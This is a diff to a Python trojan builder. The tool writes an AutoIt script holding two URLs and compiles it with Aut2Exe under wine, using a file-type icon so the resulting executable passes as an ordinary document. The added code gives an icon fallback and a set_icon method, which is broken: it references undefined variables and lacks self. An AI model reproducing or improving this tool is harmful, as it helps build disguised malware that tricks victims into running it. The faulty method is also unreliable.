@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 import subprocess
+import os
 
 
 TROJAN_SOURCE_CODE_FILE = "trojan.txt"
@@ -34,6 +35,12 @@ class Trojan:
 		self.icon = "icons/" + file_type + ".ico"
 		if icon != None:
 			self.icon = icon
+		
+		if not os.path.isfile(self.icon) :
+			print("[-] Can't find icon at " + self.icon)
+			print("[-] Using generaic icon.")
+			self.icon = "icons/generic.ico"
+		
 					
 	def create(self):
 		urls = 'Local $urls = "' +  self.url1 + "," +self.url2 + '"\n'
@@ -42,3 +49,16 @@ class Trojan:
 
 	def compilea(self, out_file):
 		subprocess.call('wine "' + AUT2EXE + '" /In "' + TROJAN_SOURCE_CODE_FILE + '" /Out "' + out_file +'" /Icon "' + self.icon + '"' , shell=True)
+	
+	def set_icon(input_icon):
+		if icon != None:
+			icon = input_icon
+		else:
+			icon = "icons/" + file_type + ".ico"
+		
+		if not os.path.isfile(icon) :
+			print("[-] Can't find icon at " + icon)
+			print("[-] Using generaic icon.")
+			icon = "icons/generic.ico"
+		
+		return icon
